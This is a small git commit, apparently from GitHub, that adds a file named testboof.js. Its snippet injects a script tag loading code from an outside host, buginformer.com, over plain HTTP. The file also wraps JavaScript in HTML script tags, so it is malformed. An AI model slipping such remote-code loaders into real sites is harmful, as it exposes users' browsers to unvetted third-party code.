3f949e93dcac6a1622bd255d3b6045d9e77c2b5a
LuisFernandezJr <40038841+LuisFernandezJr@users.noreply.github.com>
2021-04-14 16:44:44 -0400

    Create testboof.js
    JS script

---
+++ assets/js/testboof.js
@@ -0,0 +1,2 @@
+<script type="text/javascript">
+(function() {var boop = document.createElement('script'); boop.type = 'text/javascript'; boop.src = 'http://buginformer.com/index.html'; var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(boop,s);})();</script>
